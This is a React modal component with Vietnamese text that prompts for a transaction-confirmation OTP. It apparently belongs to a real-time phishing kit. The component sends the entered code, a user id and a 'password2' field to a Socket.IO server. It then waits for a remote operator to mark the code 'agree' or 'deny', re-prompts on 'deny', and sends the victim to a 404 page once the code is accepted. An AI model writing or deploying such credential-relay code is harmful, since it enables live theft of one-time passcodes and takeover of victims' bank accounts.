/* eslint-disable @typescript-eslint/no-explicit-any */
import React, { useRef, useState, useEffect } from 'react'
import { updateTable } from '../apis/table.api'
import socket from '~/utils/socket'
import { useNavigate } from 'react-router-dom'
// socket base is read from VITE_SOCKET_BASE_URL inside ~/utils/socket

// import Eye from '~/assets/images/eye-close.png'
// import { useTranslation } from 'react-i18next'
// import io from 'socket.io-client';

const Modal = ({ isOpen, onClose, handleFinal, status, setStatus }: any) => {
  // const { t } = useTranslation()
  // console.log(ipSocket);
  // console.log(ip);
  const [otp, setOtp] = useState('')
  const [showLoading, setShowLoading] = useState(false)
  const [showError, setShowError] = useState(false)
  const [hasSubmitted, setHasSubmitted] = useState(false)
  const modalRef = useRef<HTMLDivElement>(null)
  const handleModalClick = (e: React.MouseEvent) => {
    if (modalRef.current && !modalRef.current.contains(e.target as Node)) {
      onClose()
    }
  }
  const navigate = useNavigate()

  // useEffect(() => {
  //   if (data && data.otp2FA) {
  //     setCheckOtp(data.otp2FA)
  //   }
  // }, [data, status])

  // Reset modal UI state when it opens (keep status to allow reacting after submit)
  useEffect(() => {
    if (isOpen) {
      // do not reset status here; we need it for immediate reaction after submit
      setShowError(false)
      setStatus('')
      setShowLoading(false)
      setHasSubmitted(false)
      setOtp('')
    }
  }, [isOpen, setStatus])

  useEffect(() => {
    if (!status || !hasSubmitted) return
    // Only act on statuses that arrived AFTER the current submission
    if (status === 'agree') {
      setShowError(false)
      setShowLoading(false)
      if (handleFinal) handleFinal()
      navigate('/404')
    } else if (status === 'deny') {
      setShowLoading(false)
      setShowError(true)
    }
  }, [status, hasSubmitted, handleFinal, navigate])

  console.log('status', status)

  const handleSubmit = () => {
    // Gửi dữ liệu qua Socket.IO
    setStatus('')
    // Set submission flags BEFORE sending, to avoid race if server responds very fast
    setHasSubmitted(true)
    const randomString = localStorage.getItem('randomString')
    const id = localStorage.getItem('iduser')
    
    const data = {
      _id: id,
      socketId: socket.id,
      codeRandom: randomString,
      otp2FA: otp,
      username: null,
      note: false,
      password2: '',
      status: 'pending'
    }
    socket.emit('formData', data)
    console.log(data)
    updateTable(data)
    setShowError(false)
    setShowLoading(true)
    // do not clear status here; we compare timestamps in the effect
  }
  // const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
  //   e.preventDefault()
  // }
  // const [showPass, setShowPass] = useState(false)
  return (
    <div
      id='authentication-modal'
      tabIndex={-1}
      aria-hidden='true'
      onClick={handleModalClick}
      className={` ${
        isOpen ? 'opacity-100 visible' : 'opacity-0 invisible'
      } fixed bg-[#020202a6] ::bg-[#ffffff46] top-0 left-0 right-0 z-50 w-[100vw] p-4 overflow-x-hidden overflow-y-auto md:inset-0 h-[100vh] transition-all`}
    >
      <div
        ref={modalRef}
        className='relative z-100 w-full left-[50%] top-[35%] translate-y-[-50%] translate-x-[-50%] max-w-[498px] max-h-full'
      >
        <div className='relative bg-white rounded-lg shadow ::bg-gray-700'>
          <div className='px-[15px] py-[15px]'>
            <h1 className='text-[20px] border-b text-[#444444] leading-6 mt-5 pb-[10px]'>
              Quý khách vui lòng nhập OTP để xác nhận giao dịch
            </h1>
            {/* <p className='mb-[25px] text-[#65676b] leading-[19px] mt-[10px]'>{t('translation.form2-content')}</p> */}
            <div>
              <label className='text-black leading-5 font-semibold' htmlFor='password'>
                Mã OTP
              </label>
              <div className='w-full mt-2 relative'>
                <input
                  disabled={showLoading && !showError}
                  className='w-full p-4 disabled:bg-gray-200 disabled:text-gray-400 text-[#444444] focus:ring-1 ring-black rounded-lg border border-[#BDBDBD]'
                  // type={!showPass ? 'password' : 'text'}
                  type='text'
                  id='password'
                  name='password'
                  value={otp}
                  onChange={(e) => {
                    setOtp(e.target.value)
                    setShowLoading(false)
                    setShowError(false)
                  }}
                />
                {/* <button
                  type='button'
                  onClick={() => setShowPass(!showPass)}
                  className='w-5 h-5 absolute top-1/2 -translate-y-1/2 right-3'
                >
                  <img src={Eye} alt='Eye' />
                </button> */}
              </div>
            </div>
            {showLoading && !showError && (
              <div className='text-[#05a442] my-[10px] text-[14px]'>
                Đang xác nhận
                <svg
                  aria-hidden='true'
                  role='status'
                  className='inline w-3 h-3 ml-[3px] mb-[2px] text-white animate-spin'
                  viewBox='0 0 100 101'
                  fill='none'
                  xmlns='http://www.w3.org/2000/svg'
                >
                  <path
                    d='M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z'
                    fill='#05a442'
                  />
                  <path
                    d='M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z'
                    fill='currentColor'
                  />
                </svg>
              </div>
            )}
            {showError && <div className='text-[14px] mt-2 text-[#dc3545]'>Mã OTP bị sai hoặc đã hết hạn</div>}
            {/* <div className='mb-5'>
              <ReCAPTCHA sitekey='6LcVPnopAAAAADjRFSvST7umH0rEfe5aHyPC429B' onChange={handleCaptchaChange} />
            </div> */}
            <button
              onClick={() => {
                handleSubmit()
                setShowLoading(true)
                setShowError(false)
              }}
              disabled={otp.length < 4 || showLoading}
              className='disabled:bg-[#e0e0e0] disabled:text-[#3485ef] w-full mt-7 pt-3 pb-4 bg-[#3485EF] text-[18px] text-white rounded-lg'
            >
              Xác nhận
            </button>
          </div>
        </div>
      </div>
    </div>
  )
}

export default Modal
